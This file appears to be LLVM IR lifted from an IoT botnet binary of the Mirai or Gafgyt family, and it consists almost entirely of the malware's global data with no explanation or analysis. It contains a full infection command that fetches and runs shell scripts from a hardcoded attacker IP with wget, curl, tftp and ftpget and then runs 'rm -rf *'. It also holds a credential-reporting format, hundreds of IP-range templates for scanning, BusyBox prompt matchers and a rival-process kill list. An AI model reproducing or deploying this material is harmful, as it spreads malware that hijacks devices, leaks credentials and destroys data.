source_filename = "test"
target datalayout = "e-m:e-p:32:32-f64:32:64-f80:32-n8:16:32-S128"

%_TYPEDEF_sigset_t = type { [1 x i32] }
%timespec = type { i32, i32 }
%sigcontext = type { i32 }
%sigaction = type { void (i32)*, i32, void ()*, %_TYPEDEF_sigset_t }
%pollfd = type { i32, i16, i16 }

@df = internal unnamed_addr global i1 false
@of = internal unnamed_addr global i1 false
@eax = internal unnamed_addr global i32 0
@ecx = internal unnamed_addr global i32 0
@edx = internal unnamed_addr global i32 0
@ebx = internal unnamed_addr global i32 0
@esp = internal unnamed_addr global i32 0
@ebp = internal unnamed_addr global i32 0
@esi = internal unnamed_addr global i32 0
@edi = internal unnamed_addr global i32 0
@0 = external global i32
@global_var_805f00c.2 = global i32 0
@global_var_805f024.3 = local_unnamed_addr global i32* @global_var_805f00c.2
@global_var_805eee4.4 = constant i32 0
@global_var_805f4c4.5 = global i32 0
@global_var_805f010.6 = local_unnamed_addr global i32 0
@global_var_805f500.7 = global i32 0
@global_var_805f504.8 = local_unnamed_addr global i32 0
@global_var_805f508.9 = local_unnamed_addr global i32 0
@global_var_805f1b8.10 = local_unnamed_addr global i32 4095
@global_var_805f1b4.11 = local_unnamed_addr global i32 362436
@global_var_8058e52.12 = constant [7 x i8] c"(null)\00"
@global_var_8058e59.14 = constant [3 x i8] c"-c\00"
@global_var_8058e5c.15 = constant [3 x i8] c"sh\00"
@global_var_8058e5f.16 = constant [8 x i8] c"/bin/sh\00"
@global_var_8058e80.17 = constant i32 -1
@global_var_8059280.18 = constant [14 x i8] c"/proc/cpuinfo\00"
@global_var_805928e.19 = constant [9 x i8] c"BOGOMIPS\00"
@global_var_8059297.21 = constant [5 x i8] c"PING\00"
@global_var_805929c.22 = constant [14 x i8] c"gethostbyname\00"
@global_var_805f4e8.23 = local_unnamed_addr global i32 0
@global_var_805f4ec.24 = local_unnamed_addr global i32 0
@global_var_8065774.25 = local_unnamed_addr global i32 0
@global_var_80592aa.26 = constant [6 x i8] c":>%$#\00"
@global_var_80592b1.31 = constant [12 x i8] c"112.5.%d.%d\00"
@global_var_80592bd.32 = constant [14 x i8] c"117.165.%d.%d\00"
@global_var_80592cb.33 = constant [11 x i8] c"85.3.%d.%d\00"
@global_var_80592d6.34 = constant [13 x i8] c"37.158.%d.%d\00"
@global_var_80592e3.35 = constant [11 x i8] c"95.9.%d.%d\00"
@global_var_80592ee.36 = constant [13 x i8] c"41.252.%d.%d\00"
@global_var_80592fb.37 = constant [12 x i8] c"58.71.%d.%d\00"
@global_var_8059307.38 = constant [13 x i8] c"104.55.%d.%d\00"
@global_var_8059314.39 = constant [13 x i8] c"78.186.%d.%d\00"
@global_var_8059321.40 = constant [13 x i8] c"78.189.%d.%d\00"
@global_var_805932e.41 = constant [14 x i8] c"221.120.%d.%d\00"
@global_var_805933c.42 = constant [11 x i8] c"88.5.%d.%d\00"
@global_var_8059347.43 = constant [13 x i8] c"41.254.%d.%d\00"
@global_var_8059354.44 = constant [13 x i8] c"103.20.%d.%d\00"
@global_var_8059361.45 = constant [13 x i8] c"103.47.%d.%d\00"
@global_var_805936e.46 = constant [13 x i8] c"103.57.%d.%d\00"
@global_var_805937b.47 = constant [13 x i8] c"45.117.%d.%d\00"
@global_var_8059388.48 = constant [13 x i8] c"101.51.%d.%d\00"
@global_var_8059395.49 = constant [13 x i8] c"137.59.%d.%d\00"
@global_var_80593a2.50 = constant [11 x i8] c"1.56.%d.%d\00"
@global_var_80593ad.51 = constant [12 x i8] c"1.188.%d.%d\00"
@global_var_80593b9.52 = constant [13 x i8] c"14.204.%d.%d\00"
@global_var_80593c6.53 = constant [11 x i8] c"27.0.%d.%d\00"
@global_var_80593d1.54 = constant [11 x i8] c"27.8.%d.%d\00"
@global_var_80593dc.55 = constant [12 x i8] c"27.50.%d.%d\00"
@global_var_80593e8.56 = constant [12 x i8] c"27.54.%d.%d\00"
@global_var_80593f4.57 = constant [12 x i8] c"27.98.%d.%d\00"
@global_var_8059400.58 = constant [13 x i8] c"27.112.%d.%d\00"
@global_var_805940d.59 = constant [13 x i8] c"27.192.%d.%d\00"
@global_var_805941a.60 = constant [12 x i8] c"36.32.%d.%d\00"
@global_var_8059426.61 = constant [13 x i8] c"36.248.%d.%d\00"
@global_var_8059433.62 = constant [12 x i8] c"39.64.%d.%d\00"
@global_var_805943f.63 = constant [11 x i8] c"42.4.%d.%d\00"
@global_var_805944a.64 = constant [12 x i8] c"42.48.%d.%d\00"
@global_var_8059456.65 = constant [12 x i8] c"42.52.%d.%d\00"
@global_var_8059462.66 = constant [12 x i8] c"42.56.%d.%d\00"
@global_var_805946e.67 = constant [12 x i8] c"42.63.%d.%d\00"
@global_var_805947a.68 = constant [12 x i8] c"42.84.%d.%d\00"
@global_var_8059486.69 = constant [13 x i8] c"42.176.%d.%d\00"
@global_var_8059493.70 = constant [13 x i8] c"42.224.%d.%d\00"
@global_var_80594a0.71 = constant [13 x i8] c"43.253.%d.%d\00"
@global_var_80594ad.72 = constant [13 x i8] c"43.230.%d.%d\00"
@global_var_80594ba.73 = constant [13 x i8] c"163.53.%d.%d\00"
@global_var_80594c7.74 = constant [13 x i8] c"62.252.%d.%d\00"
@global_var_80594d4.75 = constant [13 x i8] c"43.245.%d.%d\00"
@global_var_80594e1.76 = constant [13 x i8] c"62.255.%d.%d\00"
@global_var_80594ee.77 = constant [13 x i8] c"123.25.%d.%d\00"
@global_var_80594fb.78 = constant [13 x i8] c"103.54.%d.%d\00"
@global_var_8059508.79 = constant [13 x i8] c"27.255.%d.%d\00"
@global_var_8059515.80 = constant [14 x i8] c"103.204.%d.%d\00"
@global_var_8059523.81 = constant [13 x i8] c"123.24.%d.%d\00"
@global_var_8059530.82 = constant [14 x i8] c"113.191.%d.%d\00"
@global_var_805953e.83 = constant [13 x i8] c"81.100.%d.%d\00"
@global_var_805954b.84 = constant [14 x i8] c"113.188.%d.%d\00"
@global_var_8059559.85 = constant [14 x i8] c"113.189.%d.%d\00"
@global_var_8059567.86 = constant [13 x i8] c"94.174.%d.%d\00"
@global_var_8059574.87 = constant [13 x i8] c"14.160.%d.%d\00"
@global_var_8059581.88 = constant [13 x i8] c"14.161.%d.%d\00"
@global_var_805958e.89 = constant [13 x i8] c"14.162.%d.%d\00"
@global_var_805959b.90 = constant [13 x i8] c"14.163.%d.%d\00"
@global_var_80595a8.91 = constant [13 x i8] c"14.164.%d.%d\00"
@global_var_80595b5.92 = constant [13 x i8] c"14.165.%d.%d\00"
@global_var_80595c2.93 = constant [13 x i8] c"14.166.%d.%d\00"
@global_var_80595cf.94 = constant [13 x i8] c"14.167.%d.%d\00"
@global_var_80595dc.95 = constant [13 x i8] c"14.168.%d.%d\00"
@global_var_80595e9.96 = constant [13 x i8] c"14.169.%d.%d\00"
@global_var_80595f6.97 = constant [13 x i8] c"14.170.%d.%d\00"
@global_var_8059603.98 = constant [13 x i8] c"14.171.%d.%d\00"
@global_var_8059610.99 = constant [13 x i8] c"14.172.%d.%d\00"
@global_var_805961d.100 = constant [13 x i8] c"14.173.%d.%d\00"
@global_var_805962a.101 = constant [13 x i8] c"14.174.%d.%d\00"
@global_var_8059637.102 = constant [13 x i8] c"14.175.%d.%d\00"
@global_var_8059644.103 = constant [13 x i8] c"14.176.%d.%d\00"
@global_var_8059651.104 = constant [13 x i8] c"14.177.%d.%d\00"
@global_var_805965e.105 = constant [13 x i8] c"14.178.%d.%d\00"
@global_var_805966b.106 = constant [13 x i8] c"14.179.%d.%d\00"
@global_var_8059678.107 = constant [13 x i8] c"14.180.%d.%d\00"
@global_var_8059685.108 = constant [13 x i8] c"14.181.%d.%d\00"
@global_var_8059692.109 = constant [13 x i8] c"14.182.%d.%d\00"
@global_var_805969f.110 = constant [13 x i8] c"14.183.%d.%d\00"
@global_var_80596ac.111 = constant [13 x i8] c"14.184.%d.%d\00"
@global_var_80596b9.112 = constant [13 x i8] c"14.185.%d.%d\00"
@global_var_80596c6.113 = constant [13 x i8] c"14.186.%d.%d\00"
@global_var_80596d3.114 = constant [13 x i8] c"14.187.%d.%d\00"
@global_var_80596e0.115 = constant [13 x i8] c"14.188.%d.%d\00"
@global_var_80596ed.116 = constant [13 x i8] c"14.189.%d.%d\00"
@global_var_80596fa.117 = constant [13 x i8] c"14.190.%d.%d\00"
@global_var_8059707.118 = constant [13 x i8] c"14.191.%d.%d\00"
@global_var_8059714.119 = constant [13 x i8] c"45.121.%d.%d\00"
@global_var_8059721.120 = constant [13 x i8] c"45.120.%d.%d\00"
@global_var_805972e.121 = constant [13 x i8] c"45.115.%d.%d\00"
@global_var_805973b.122 = constant [13 x i8] c"43.252.%d.%d\00"
@global_var_8059748.123 = constant [13 x i8] c"43.240.%d.%d\00"
@global_var_8059755.124 = constant [13 x i8] c"41.174.%d.%d\00"
@global_var_8059762.125 = constant [13 x i8] c"49.118.%d.%d\00"
@global_var_805976f.126 = constant [13 x i8] c"78.188.%d.%d\00"
@global_var_805977c.127 = constant [13 x i8] c"45.127.%d.%d\00"
@global_var_8059789.128 = constant [13 x i8] c"103.30.%d.%d\00"
@global_var_8059796.129 = constant [12 x i8] c"14.33.%d.%d\00"
@global_var_80597a2.130 = constant [13 x i8] c"123.16.%d.%d\00"
@global_var_80597af.131 = constant [13 x i8] c"202.44.%d.%d\00"
@global_var_80597bc.132 = constant [13 x i8] c"116.93.%d.%d\00"
@global_var_80597c9.133 = constant [12 x i8] c"91.83.%d.%d\00"
@global_var_80597d5.134 = constant [13 x i8] c"41.253.%d.%d\00"
@global_var_80597e2.135 = constant [14 x i8] c"117.173.%d.%d\00"
@global_var_80597f0.136 = constant [14 x i8] c"113.190.%d.%d\00"
@global_var_80597fe.137 = constant [13 x i8] c"146.88.%d.%d\00"
@global_var_805980b.138 = constant [14 x i8] c"112.196.%d.%d\00"
@global_var_8059819.139 = constant [14 x i8] c"113.178.%d.%d\00"
@global_var_8059827.140 = constant [13 x i8] c"112.45.%d.%d\00"
@global_var_8059834.141 = constant [14 x i8] c"183.223.%d.%d\00"
@global_var_8059842.142 = constant [13 x i8] c"116.71.%d.%d\00"
@global_var_805984f.143 = constant [13 x i8] c"103.44.%d.%d\00"
@global_var_805985c.144 = constant [14 x i8] c"110.235.%d.%d\00"
@global_var_805986a.145 = constant [14 x i8] c"124.253.%d.%d\00"
@global_var_8059878.146 = constant [14 x i8] c"211.237.%d.%d\00"
@global_var_8059886.147 = constant [14 x i8] c"117.175.%d.%d\00"
@global_var_8059894.148 = constant [13 x i8] c"178.93.%d.%d\00"
@global_var_80598a1.149 = constant [12 x i8] c"111.9.%d.%d\00"
@global_var_80598ad.150 = constant [14 x i8] c"222.252.%d.%d\00"
@global_var_80598bb.151 = constant [14 x i8] c"113.174.%d.%d\00"
@global_var_80598c9.152 = constant [14 x i8] c"113.160.%d.%d\00"
@global_var_80598d7.153 = constant [14 x i8] c"113.161.%d.%d\00"
@global_var_80598e5.154 = constant [14 x i8] c"113.162.%d.%d\00"
@global_var_80598f3.155 = constant [14 x i8] c"113.163.%d.%d\00"
@global_var_8059901.156 = constant [14 x i8] c"113.164.%d.%d\00"
@global_var_805990f.157 = constant [14 x i8] c"113.165.%d.%d\00"
@global_var_805991d.158 = constant [14 x i8] c"113.166.%d.%d\00"
@global_var_805992b.159 = constant [14 x i8] c"113.167.%d.%d\00"
@global_var_8059939.160 = constant [14 x i8] c"113.168.%d.%d\00"
@global_var_8059947.161 = constant [14 x i8] c"113.169.%d.%d\00"
@global_var_8059955.162 = constant [13 x i8] c"123.17.%d.%d\00"
@global_var_8059962.163 = constant [13 x i8] c"123.18.%d.%d\00"
@global_var_805996f.164 = constant [13 x i8] c"123.19.%d.%d\00"
@global_var_805997c.165 = constant [13 x i8] c"123.20.%d.%d\00"
@global_var_8059989.166 = constant [13 x i8] c"123.21.%d.%d\00"
@global_var_8059996.167 = constant [13 x i8] c"123.22.%d.%d\00"
@global_var_80599a3.168 = constant [14 x i8] c"222.253.%d.%d\00"
@global_var_80599b1.169 = constant [14 x i8] c"222.254.%d.%d\00"
@global_var_80599bf.170 = constant [14 x i8] c"222.255.%d.%d\00"
@global_var_80599cd.171 = constant [13 x i8] c"37.247.%d.%d\00"
@global_var_80599da.172 = constant [13 x i8] c"41.208.%d.%d\00"
@global_var_80599e7.173 = constant [14 x i8] c"183.220.%d.%d\00"
@global_var_80599f5.174 = constant [14 x i8] c"175.201.%d.%d\00"
@global_var_8059a03.175 = constant [14 x i8] c"103.198.%d.%d\00"
@global_var_8059a11.176 = constant [13 x i8] c"50.205.%d.%d\00"
@global_var_8059a1e.177 = constant [13 x i8] c"88.248.%d.%d\00"
@global_var_8059a2b.178 = constant [13 x i8] c"88.105.%d.%d\00"
@global_var_8059a38.179 = constant [13 x i8] c"88.247.%d.%d\00"
@global_var_8059a45.180 = constant [13 x i8] c"85.105.%d.%d\00"
@global_var_8059a52.181 = constant [12 x i8] c"188.3.%d.%d\00"
@global_var_8059a5e.182 = constant [14 x i8] c"103.203.%d.%d\00"
@global_var_8059a6c.183 = constant [13 x i8] c"103.55.%d.%d\00"
@global_var_8059a79.184 = constant [14 x i8] c"103.220.%d.%d\00"
@global_var_8059a87.185 = constant [14 x i8] c"183.233.%d.%d\00"
@global_var_8059a95.186 = constant [14 x i8] c"103.242.%d.%d\00"
@global_var_8059aa3.187 = constant [13 x i8] c"103.14.%d.%d\00"
@global_var_8059ab0.188 = constant [14 x i8] c"103.195.%d.%d\00"
@global_var_8059abe.189 = constant [14 x i8] c"103.214.%d.%d\00"
@global_var_8059acc.190 = constant [14 x i8] c"103.218.%d.%d\00"
@global_var_8059ada.191 = constant [14 x i8] c"103.225.%d.%d\00"
@global_var_8059ae8.192 = constant [14 x i8] c"103.228.%d.%d\00"
@global_var_8059af6.193 = constant [14 x i8] c"103.231.%d.%d\00"
@global_var_8059b04.194 = constant [13 x i8] c"103.60.%d.%d\00"
@global_var_8059b11.195 = constant [14 x i8] c"103.248.%d.%d\00"
@global_var_8059b1f.196 = constant [14 x i8] c"103.253.%d.%d\00"
@global_var_8059b2d.197 = constant [14 x i8] c"103.255.%d.%d\00"
@global_var_8059b3b.198 = constant [13 x i8] c"103.35.%d.%d\00"
@global_var_8059b48.199 = constant [13 x i8] c"103.49.%d.%d\00"
@global_var_8059b55.200 = constant [13 x i8] c"103.62.%d.%d\00"
@global_var_8059b62.201 = constant [13 x i8] c"144.48.%d.%d\00"
@global_var_8059b6f.202 = constant [13 x i8] c"163.47.%d.%d\00"
@global_var_8059b7c.203 = constant [13 x i8] c"223.29.%d.%d\00"
@global_var_8059b89.204 = constant [13 x i8] c"59.153.%d.%d\00"
@global_var_8059b96.205 = constant [14 x i8] c"113.176.%d.%d\00"
@global_var_8059ba4.206 = constant [14 x i8] c"113.175.%d.%d\00"
@global_var_8059bb2.207 = constant [14 x i8] c"113.177.%d.%d\00"
@global_var_8059bc0.208 = constant [14 x i8] c"113.183.%d.%d\00"
@global_var_8059bce.209 = constant [14 x i8] c"202.164.%d.%d\00"
@global_var_8059bdc.210 = constant [14 x i8] c"203.134.%d.%d\00"
@global_var_8059bea.211 = constant [13 x i8] c"210.56.%d.%d\00"
@global_var_8059bf7.212 = constant [13 x i8] c"49.156.%d.%d\00"
@global_var_8059c04.213 = constant [14 x i8] c"203.210.%d.%d\00"
@global_var_8059c12.214 = constant [14 x i8] c"117.181.%d.%d\00"
@global_var_8059c20.215 = constant [14 x i8] c"117.178.%d.%d\00"
@global_var_8059c2e.216 = constant [14 x i8] c"117.177.%d.%d\00"
@global_var_8059c3c.217 = constant [14 x i8] c"117.176.%d.%d\00"
@global_var_8059c4a.218 = constant [14 x i8] c"117.170.%d.%d\00"
@global_var_8059c58.219 = constant [14 x i8] c"117.171.%d.%d\00"
@global_var_8059c66.220 = constant [14 x i8] c"117.162.%d.%d\00"
@global_var_8059c74.221 = constant [13 x i8] c"112.26.%d.%d\00"
@global_var_8059c81.222 = constant [13 x i8] c"112.27.%d.%d\00"
@global_var_8059c8e.223 = constant [13 x i8] c"112.28.%d.%d\00"
@global_var_8059c9b.224 = constant [13 x i8] c"112.29.%d.%d\00"
@global_var_8059ca8.225 = constant [13 x i8] c"112.30.%d.%d\00"
@global_var_8059cb5.226 = constant [13 x i8] c"112.31.%d.%d\00"
@global_var_8059cc2.227 = constant [14 x i8] c"203.150.%d.%d\00"
@global_var_8059cd0.228 = constant [13 x i8] c"50.233.%d.%d\00"
@global_var_805f1c0.229 = global i32 110
@global_var_8059cdd.231 = constant [12 x i8] c"%d.%d.%d.%d\00"
@global_var_8065768.232 = local_unnamed_addr global i32 0
@global_var_8058e43.233 = constant [8 x i8] c"BusyBox\00"
@global_var_8058e4b.234 = constant i32 2293796
@global_var_8058e4d.235 = constant i32 595460131
@global_var_8058e4f.236 = constant [3 x i8] c"~#\00"
@global_var_805f160.237 = global [4 x i8*] [i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_8058e43.233, i32 0, i32 0), i8* bitcast (i32* @global_var_8058e4b.234 to i8*), i8* bitcast (i32* @global_var_8058e4d.235 to i8*), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_8058e4f.236, i32 0, i32 0)]
@global_var_8058e17.238 = constant [7 x i8] c"nvalid\00"
@global_var_8058e1e.239 = constant [6 x i8] c"ailed\00"
@global_var_8058e24.240 = constant [9 x i8] c"ncorrect\00"
@global_var_8058e2d.241 = constant [6 x i8] c"enied\00"
@global_var_8058e33.242 = constant [5 x i8] c"rror\00"
@global_var_8058e38.243 = constant [7 x i8] c"oodbye\00"
@global_var_8058e3f.244 = constant [4 x i8] c"bad\00"
@global_var_805f140.245 = global [7 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_8058e17.238, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8058e1e.239, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8058e24.240, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8058e2d.241, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8058e33.242, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_8058e38.243, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8058e3f.244, i32 0, i32 0)]
@global_var_805f11c = external global i32
@global_var_8059ce9.250 = constant [3 x i8] c"\0D\0A\00"
@global_var_805f180.251 = global [10 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_8058e17.238, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8058e1e.239, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8058e24.240, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8058e2d.241, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8058e33.242, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_8058e38.243, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8058e3f.244, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_8058e43.233, i32 0, i32 0), i8* bitcast (i32* @global_var_8058e4b.234 to i8*), i8* bitcast (i32* @global_var_8058e4d.235 to i8*)]
@global_var_8059cec.252 = constant i32 993024795
@global_var_8059d58.253 = constant [16 x i8] c"REPORT %s:%s:%s\00"
@global_var_8058b40.254 = constant [703 x i8] c"cd /tmp || cd /var/run || cd /mnt || cd /root || cd / || busybox cd /tmp || busybox cd /var/run || busybox cd /mnt || busybox cd /root || busybox cd / || /bin/busybox cd /tmp || /bin/busybox cd /var/run || /bin/busybox cd /mnt || /bin/busybox cd /root || /bin/busybox cd /; wget http://191.96.249.102/bitch.sh || curl http://191.96.249.102/bitch.sh; chmod 777 bitch.sh; sh bitch.sh; tftp 191.96.249.102 -c get voidtftp.sh; chmod 777 voidtftp.sh; sh voidtftp.sh; tftp -r voidtftp2.sh -g 191.96.249.102; chmod 777 voidtftp2.sh; sh voidtftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 191.96.249.102 voidftp.sh voidftp.sh; sh voidftp.sh; rm -rf bitch.sh voidtftp.sh voidtftp2.sh voidftp.sh; rm -rf * \0D\0A\00"
@global_var_805f118.255 = local_unnamed_addr global [703 x i8]* @global_var_8058b40.254
@global_var_8059d90.257 = constant [711 x i8] c"%s cd /tmp || cd /var/run || cd /mnt || cd /root || cd / || busybox cd /tmp || busybox cd /var/run || busybox cd /mnt || busybox cd /root || busybox cd / || /bin/busybox cd /tmp || /bin/busybox cd /var/run || /bin/busybox cd /mnt || /bin/busybox cd /root || /bin/busybox cd /; wget http://191.96.249.102/bitch.sh || curl http://191.96.249.102/bitch.sh ; chmod 777 bitch.sh; sh bitch.sh; tftp 191.96.249.102 -c get voidtftp.sh; chmod 777 voidtftp.sh; sh voidtftp.sh; tftp -r voidtftp2.sh -g 191.96.249.102; chmod 777 voidtftp2.sh; sh voidtftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 191.96.249.102 voidftp.sh voidftp.sh; sh voidftp.sh; rm -rf bitch.sh voidtftp.sh voidtftp2.sh voidftp.sh; rm -rf * \0D\0A x00\00"
@global_var_805a058.258 = constant [704 x i8] c"cd /tmp || cd /var/run || cd /mnt || cd /root || cd / || busybox cd /tmp || busybox cd /var/run || busybox cd /mnt || busybox cd /root || busybox cd / || /bin/busybox cd /tmp || /bin/busybox cd /var/run || /bin/busybox cd /mnt || /bin/busybox cd /root || /bin/busybox cd /; wget http://191.96.249.102/bitch.sh || curl http://191.96.249.102/bitch.sh ; chmod 777 bitch.sh; sh bitch.sh; tftp 191.96.249.102 -c get voidtftp.sh; chmod 777 voidtftp.sh; sh voidtftp.sh; tftp -r voidtftp2.sh -g 191.96.249.102; chmod 777 voidtftp2.sh; sh voidtftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 191.96.249.102 voidftp.sh voidftp.sh; sh voidftp.sh; rm -rf bitch.sh voidtftp.sh voidtftp2.sh voidftp.sh; rm -rf * \0D\0A\00"
@global_var_805b9dc.259 = constant [15 x i8] c"/dev/netslink/\00"
@global_var_805b9eb.260 = constant [6 x i8] c"/tmp/\00"
@global_var_805b9f1.261 = constant [6 x i8] c"/var/\00"
@global_var_805b9f7.262 = constant [6 x i8] c"/dev/\00"
@global_var_805b9fd.263 = constant [10 x i8] c"/var/run/\00"
@global_var_805ba07.264 = constant [10 x i8] c"/dev/shm/\00"
@global_var_805ba11.265 = constant [6 x i8] c"/mnt/\00"
@global_var_805ba17.266 = constant [7 x i8] c"/boot/\00"
@global_var_805ba1e.267 = constant [6 x i8] c"/usr/\00"
@global_var_805ba40.268 = constant [9 x i8*] [i8* getelementptr inbounds ([15 x i8], [15 x i8]* @global_var_805b9dc.259, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_805b9eb.260, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_805b9f1.261, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_805b9f7.262, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_805b9fd.263, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_805ba07.264, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_805ba11.265, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_805ba17.266, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_805ba1e.267, i32 0, i32 0)]
@global_var_805aee4.269 = constant [5 x i8] c"wget\00"
@global_var_805aee9.270 = constant [6 x i8] c"armv*\00"
@global_var_805a366.271 = constant [5 x i8] c"bot*\00"
@global_var_805aeef.272 = constant [6 x i8] c"ntpd*\00"
@global_var_805a376.273 = constant [7 x i8] c"hackz*\00"
@global_var_805aef5.274 = constant [8 x i8] c"shitty*\00"
@global_var_805aefd.275 = constant [6 x i8] c"jack*\00"
@global_var_805a346.276 = constant [6 x i8] c"mips*\00"
@global_var_805a32e.277 = constant [5 x i8] c"sex*\00"
@global_var_805af03.278 = constant [4 x i8] c"i86\00"
@global_var_805af07.279 = constant [5 x i8] c"ssh*\00"
@global_var_805a361.280 = constant [5 x i8] c"sh4*\00"
@global_var_805a36b.281 = constant [11 x i8] c"jackmeoff*\00"
@global_var_805a333.282 = constant [6 x i8] c"tftp*\00"
@global_var_805af0c.283 = constant [4 x i8] c"i56\00"
@global_var_805af10.284 = constant [5 x i8] c"mips\00"
@global_var_805af15.285 = constant [7 x i8] c"mipsel\00"
@global_var_805af1c.286 = constant [4 x i8] c"sh4\00"
@global_var_805af20.287 = constant [4 x i8] c"x86\00"
@global_var_805af24.288 = constant [5 x i8] c"i686\00"
@global_var_805af29.289 = constant [4 x i8] c"ppc\00"
@global_var_805af2d.290 = constant [5 x i8] c"i586\00"
@global_var_805af32.291 = constant [7 x i8] c"mips64\00"
@global_var_805af39.292 = constant [6 x i8] c"sh2eb\00"
@global_var_805af3f.293 = constant [7 x i8] c"sh2elf\00"
@global_var_805af46.294 = constant [4 x i8] c"arm\00"
@global_var_805af4a.295 = constant [6 x i8] c"armv5\00"
@global_var_805af50.296 = constant [8 x i8] c"armv4tl\00"
@global_var_805af58.297 = constant [6 x i8] c"armv4\00"
@global_var_805af5e.298 = constant [6 x i8] c"armv6\00"
@global_var_805af64.299 = constant [8 x i8] c"powerpc\00"
@global_var_805af6c.300 = constant [13 x i8] c"powerpc440fp\00"
@global_var_805af79.301 = constant [5 x i8] c"m68k\00"
@global_var_805af7e.302 = constant [6 x i8] c"sparc\00"
@global_var_805af84.303 = constant [7 x i8] c"x86_64\00"
@global_var_805af8b.304 = constant [11 x i8] c"jackmymips\00"
@global_var_805af96.305 = constant [13 x i8] c"jackmymips64\00"
@global_var_805afa3.306 = constant [13 x i8] c"jackmymipsel\00"
@global_var_805afb0.307 = constant [12 x i8] c"jackmysh2eb\00"
@global_var_805afbc.308 = constant [13 x i8] c"jackmysh2elf\00"
@global_var_805afc9.309 = constant [10 x i8] c"jackmysh4\00"
@global_var_805afd3.310 = constant [10 x i8] c"jackmyx86\00"
@global_var_805afdd.311 = constant [12 x i8] c"jackmyarmv5\00"
@global_var_805afe9.312 = constant [14 x i8] c"jackmyarmv4tl\00"
@global_var_805aff7.313 = constant [12 x i8] c"jackmyarmv4\00"
@global_var_805b003.314 = constant [12 x i8] c"jackmyarmv6\00"
@global_var_805b00f.315 = constant [11 x i8] c"jackmyi686\00"
@global_var_805b01a.316 = constant [14 x i8] c"jackmypowerpc\00"
@global_var_805b028.317 = constant [19 x i8] c"jackmypowerpc440fp\00"
@global_var_805b03b.318 = constant [11 x i8] c"jackmyi586\00"
@global_var_805b046.319 = constant [11 x i8] c"jackmym68k\00"
@global_var_805b051.320 = constant [12 x i8] c"jackmysparc\00"
@global_var_805b05d.321 = constant [13 x i8] c"jackmyx86_64\00"
@global_var_805b06a.322 = constant [11 x i8] c"hackmymips\00"
@global_var_805b075.323 = constant [13 x i8] c"hackmymips64\00"
@global_var_805b082.324 = constant [13 x i8] c"hackmymipsel\00"
@global_var_805b08f.325 = constant [12 x i8] c"hackmysh2eb\00"
@global_var_805b09b.326 = constant [13 x i8] c"hackmysh2elf\00"
@global_var_805b0a8.327 = constant [10 x i8] c"hackmysh4\00"
@global_var_805b0b2.328 = constant [10 x i8] c"hackmyx86\00"
@global_var_805b0bc.329 = constant [12 x i8] c"hackmyarmv5\00"
@global_var_805b0c8.330 = constant [14 x i8] c"hackmyarmv4tl\00"
@global_var_805b0d6.331 = constant [12 x i8] c"hackmyarmv4\00"
@global_var_805b0e2.332 = constant [12 x i8] c"hackmyarmv6\00"
@global_var_805b0ee.333 = constant [11 x i8] c"hackmyi686\00"
@global_var_805b0f9.334 = constant [14 x i8] c"hackmypowerpc\00"
@global_var_805b107.335 = constant [19 x i8] c"hackmypowerpc440fp\00"
@global_var_805b11a.336 = constant [11 x i8] c"hackmyi586\00"
@global_var_805b125.337 = constant [11 x i8] c"hackmym68k\00"
@global_var_805b130.338 = constant [12 x i8] c"hackmysparc\00"
@global_var_805b13c.339 = constant [13 x i8] c"hackmyx86_64\00"
@global_var_805b149.340 = constant [3 x i8] c"b1\00"
@global_var_805b14c.341 = constant [3 x i8] c"b2\00"
@global_var_805b14f.342 = constant [3 x i8] c"b3\00"
@global_var_805b152.343 = constant [3 x i8] c"b4\00"
@global_var_805b155.344 = constant [3 x i8] c"b5\00"
@global_var_805b158.345 = constant [3 x i8] c"b6\00"
@global_var_805b15b.346 = constant [3 x i8] c"b7\00"
@global_var_805b15e.347 = constant [3 x i8] c"b8\00"
@global_var_805b161.348 = constant [3 x i8] c"b9\00"
@global_var_805b164.349 = constant [4 x i8] c"b10\00"
@global_var_805b168.350 = constant [4 x i8] c"b11\00"
@global_var_805b16c.351 = constant [4 x i8] c"b12\00"
@global_var_805b170.352 = constant [4 x i8] c"b13\00"
@global_var_805b174.353 = constant [4 x i8] c"b14\00"
@global_var_805b178.354 = constant [4 x i8] c"b15\00"
@global_var_805b17c.355 = constant [4 x i8] c"b16\00"
@global_var_805b180.356 = constant [4 x i8] c"b17\00"
@global_var_805b184.357 = constant [4 x i8] c"b18\00"
@global_var_805b188.358 = constant [4 x i8] c"b19\00"
@global_var_805b18c.359 = constant [4 x i8] c"b20\00"
@global_var_805b190.360 = constant [17 x i8] c"busyboxterrorist\00"
